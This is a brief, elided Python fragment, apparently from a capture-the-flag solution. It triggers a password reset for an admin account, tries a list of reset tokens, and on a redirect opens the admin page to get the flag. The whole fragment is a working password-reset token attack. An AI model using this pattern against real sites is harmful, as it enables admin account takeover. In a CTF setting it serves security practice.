...
requests.post(f"{TASK_URL}/reset_password", data={"username": ADMIN_USER})
...
for token in tokens:
    ...
    response = session.get(f"{TASK_URL}/reset/{token}", allow_redirects=False)
    ...
    if response.status_code == 302 and "Location" in response.headers:
        ...
        # 5. Получаем флаг
        admin_page = session.get(f"{TASK_URL}/admin")
